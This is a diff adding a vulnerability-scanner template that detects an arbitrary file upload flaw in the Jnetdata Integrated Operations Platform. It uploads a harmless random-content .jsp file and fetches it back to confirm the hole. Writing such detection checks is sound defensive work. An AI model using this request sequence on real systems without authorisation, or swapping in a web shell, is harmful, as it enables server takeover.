@@ -1,0 +1,64 @@
+id: poc-jnetdata-iop-word-anyfile-upload
+
+info:
+  name: Beijing Zhongke Jnetdata Integrated Operations Platform Word Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in the Beijing Zhongke Jnetdata Integrated Operations Platform.
+
+variables:
+  random_str: "{{rand_base(4)}}"
+  base64_payload: "{{base64(random_str)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-upload
+    method: POST
+    path:
+      - "/resources/files/ue/word"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr"
+    body: |-
+      ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+      Content-Disposition: form-data; name="file"; filename="{{random_str}}.jsp"
+      Content-Type: application/octet-stream
+
+      {{base64_payload}}
+      ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+    extractors:
+      - type: regex
+        name: uploaded_file
+        internal: true
+        regex:
+          - "files/headimg/(?P<file>.*?).jsp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/files/headimg/{{uploaded_file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{base64_payload}}"
+        part: body
